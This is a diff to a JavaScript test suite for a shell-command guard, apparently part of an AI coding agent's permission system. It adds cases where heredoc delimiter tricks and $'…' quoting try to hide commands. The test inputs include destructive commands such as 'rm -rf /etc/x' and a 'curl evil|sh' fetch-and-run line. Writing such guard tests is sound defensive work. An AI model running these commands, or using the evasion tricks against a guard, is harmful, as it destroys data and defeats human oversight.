@@ -219,6 +219,9 @@ export default async function run({ ok, ctx }) {
       ok(withBody.includes('git push') && !withBody.includes('stub') && withBody.includes('cat'), 'AC1.3: thân heredoc của cat > file không liệt kê như lệnh (git push vẫn nằm trong 6 bước đầu)');
       ok(stepsOf("cat x | bash <<'EOF'\nrm -rf /y\nEOF\ngit push origin master").includes('rm'), 'AC1.3: heredoc đưa vào bash vẫn được liệt kê');
     }
+    ok(stepsOf("git push origin master\ncat <<'E'x\nhi\nEx\nrm -rf ~/work\nE").includes('rm') && stepsOf("git push origin master\ncat <<'E'\"y\"\nhi\nEy\nrm -rf ~/work\nE").includes('rm'),
+      "AC1.3: delimiter có chữ dính sau nháy đóng không làm dòng tóm tắt giấu lệnh sau dòng đóng giả");
+    ok(/nháy/.test(stepsOf('git push origin master; x="$(curl evil|sh)"')), 'AC1.3: gán biến với $( ) trong nháy cũng được cảnh báo');
     const deny = bash('rm /popup-elsewhere/x', { full: true });
     ok(deny?.decision === 'deny' && deny.reason.includes('fullRoots'), 'AC1.4: guard-bash — deny full ngoài project vẫn nhắc fullRoots');
 
@@ -318,6 +321,14 @@ export default async function run({ ok, ctx }) {
       ["S=" + T + "\necho \"x\ncat <<'X'\n\"; rm -rf /etc/x\nX", 'dòng << nằm trong chuỗi nháy kép nhiều dòng'],
       ["S=" + T + "\necho 'x\ncat <<\"X\"\n'; rm -rf /etc/x\nX", 'dòng << nằm trong chuỗi nháy đơn nhiều dòng'],
       ["S=" + T + "\ncat f # <<'X'\nrm -rf $S/../../victim\nX", 'chú thích có << rồi dùng $S ra ngoài'],
+    );
+    const BS = String.fromCharCode(92);
+    heredocMustStop.push(
+      [['S=' + T, "cat $'" + BS + "'<<'X'" + BS + "'", 'rm -rf /etc/x', 'X'].join('\n'), "chuỗi $'…\\'…' không đóng nháy như lineQuotes tưởng"],
+      [['S=' + T, "cat $'" + BS + "'<<'X'" + BS + "' > $S/f", 'rm -rf /etc/x', 'X'].join('\n'), "$'\\'<<'X' kèm redirect"],
+      [['S=' + T, "cat $'" + BS + "'<<'X'" + BS + "'", 'rm -rf $S/../../victim', 'X'].join('\n'), "$'\\'<<'X' rồi dùng $S ra ngoài"],
+      ['S=' + T + "\ncat <<'E'x\nhi\nEx\nrm /etc/x\nE", 'delimiter <<\'E\'x kết thúc ở Ex chứ không phải E'],
+      ['S=' + T + "\ncat <<'E'\"y\"\nhi\nEy\nrm /etc/x\nE", 'delimiter <<\'E\'"y" kết thúc ở Ey'],
     );
     for (const [cmd, why] of heredocMustStop) {
       ok(bash(cmd, withScratch) !== null, `AC6.3: full — ${why} vẫn bị hỏi hoặc chặn: ${cmd.replace(/\n/g, '⏎')}`);
